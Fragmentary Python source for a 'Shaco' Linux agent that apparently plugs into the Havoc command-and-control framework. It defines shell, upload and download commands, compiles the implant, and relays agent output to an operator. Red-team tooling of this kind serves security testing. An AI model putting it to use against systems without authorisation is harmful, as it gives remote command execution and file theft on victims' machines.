...
class CommandSleep(Command):
    ...
    Help = ""
    NeedAdmin = False
    Params = [CommandParam(name="time", is_file_path=False, is_optional=False)]
    Mitr = []
...
class CommandJitter(Command):
    ...
    Name = "jitter"
    Description = (
        "change max timeout duration: jitter = random_int(sleep, sleep+maxtimeout)"
    )
    Help = "jitter <time>"
    NeedAdmin = False
    Params = [CommandParam(name="time", is_file_path=False, is_optional=False)]
...
class CommandShell(Command):
    ...
    Help = "shell <command>"
    NeedAdmin = False
    Params = [CommandParam(name="command", is_file_path=False, is_optional=False)]
    Mitr = ["T1059.004"]
...
class CommandDownload(Command):
    ...
    NeedAdmin = False
    Params = [CommandParam(name="remotefile", is_file_path=False, is_optional=False)]
    Mitr = [""]
...
class CommandUpload(Command):
    ...
    NeedAdmin = False
    Params = [
        CommandParam(name="localfile", is_file_path=True, is_optional=False),
        CommandParam(name="remotefile", is_file_path=False, is_optional=False),
    ]
    Mitr = [""]
...
class Shaco(AgentType):
    ...
    Formats = [
        ...
        {"Name": "Linux Shared Library", "Extension": "so"},
        # {
        # "Name": "MacOS",
        #    "Extension": 'macho'
        # },
        ...
        try:
            ...
            if not is_flake_exists and not which("clang"):
                self.builder_send_message(
                    cliid, MessageType.Error, "Clang compiler not found"
                )
                return
            if not path.exists("./CMakeLists.txt"):
                self.builder_send_message(
                    cliid, MessageType.Error, "CMakeLists not found"
                )
                return
            if not path.exists("./Config/Settings.c"):
                self.builder_send_message(
                    cliid, MessageType.Error, "Config File not found"
                )
                return
            ...
            if not all(var in original_cfg_data for var in config_vars):
                self.builder_send_message(
                    cliid, MessageType.Error, "Config File error, parameters not found"
                )
                return

            if int(config["Config"]["Sleep"]) <= 0:
                self.builder_send_message(
                    cliid, MessageType.Error, "Sleep has to be greater than 0"
                )
                return

            if int(config["Config"]["MaxTimeout"]) < 0:
                self.builder_send_message(
                    cliid, MessageType.Error, "MaxTimeout negative is not valid"
                )
                return

            if not config["Options"]["Arch"] in supported_arch:
                self.builder_send_message(
                    cliid, MessageType.Error, "Unsupported architecture"
                )
                return
            ...
            if config["Options"]["Format"] == "Linux Shared Library":
                self.builder_send_message(
                    cliid, MessageType.Info, "Compiling Shared Library"
                )
            ...
            try:
                ...
                if path.exists("flake.nix"):
                    out = subprocess.check_output(
                        f"nix develop .#{architecture}_compile --command bash -c 'cmake -S . -B {tmppath} {flags} && make -C {tmppath}'",
                        shell=True,
                    ...
                    self.builder_send_message(
                        cliid, MessageType.Info, out.strip().decode()
                    )

                    out = subprocess.check_output(
                        f"make -C {tmppath}", shell=True, stderr=subprocess.STDOUT
                    )
                ...
                with open(f"{tmppath}/{file}", "rb") as f:
                    self.builder_send_message(
                        cliid, MessageType.Good, "Sending compiled shaco!"
                    )
                ...
                self.builder_send_message(
                    cliid,
                    MessageType.Error,
                    f"An error ocurred on Compiling:\n{ex.output.decode()}",
                )
                print(ex.output.decode())
                print(ex.stderr)
            except Exception as ex:
                self.builder_send_message(
                    cliid, MessageType.Error, f"Error in compilation {str(ex)}"
                )
                print_exc()
                return
            finally:
            ...
            self.builder_send_message(
                cliid, MessageType.Error, f"Error on generate: {str(ex)}"
            )
            print_exc()
        ...
        if agent == None:
            ...
            try:
                if cmdid == COMMAND_UPLOAD:
                    ...
                    if v_res == RESPONSE_DOWNLOAD_SUCCESS:
                        ...
                        self.console_message(
                            ...
                            MessageType.Good,
                            "Shaco Output: ",
                            "Received file from shaco agent",
                        )
                    ...
                    out = rawdec.get_data()
                    self.console_message(
                        agentid, MessageType.Good, "Shaco Output: ", out.decode()
                    )
            except Exception as ex:
                ...
                self.console_message(
                    ...
                    MessageType.Error,
                    "Shaco Error: ",
                    f"Error in output from command {cmdid}",
                )
...
def main():
    ...
    Havoc_Service = HavocService(
        endpoint=f"wss://127.0.0.1:40056/service-endpoint", password="service-password"
    )
